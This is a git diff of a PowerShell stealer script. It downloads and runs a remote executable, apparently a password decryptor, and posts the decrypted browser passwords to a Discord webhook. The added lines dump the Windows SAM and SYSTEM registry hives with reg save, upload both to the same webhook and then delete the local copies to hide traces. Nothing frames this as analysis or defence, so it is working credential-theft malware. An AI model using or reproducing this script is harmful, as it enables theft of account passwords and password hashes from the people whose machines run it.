@@ -1,5 +1,7 @@
 cd ..\..
 cd $env:USERPROFILE
+reg save HKLM\sam ./sam.save
+reg save HKLM\system ./system.save
 
 iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
 start-sleep 5
@@ -28,5 +30,9 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 Upload-Discord -file $env:USERPROFILE\decrypted_password.csv
+Upload-Discord -file $env:USERPROFILE\sam.save
+Upload-Discord -file $env:USERPROFILE\system.save
 rm "$env:USERPROFILE\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
 rm "$env:USERPROFILE\d.exe" -r -Force -ErrorAction SilentlyContinue
+rm "$env:USERPROFILE\sam.save" -r -Force -ErrorAction SilentlyContinue
+rm "$env:USERPROFILE\system.save" -r -Force -ErrorAction SilentlyContinue
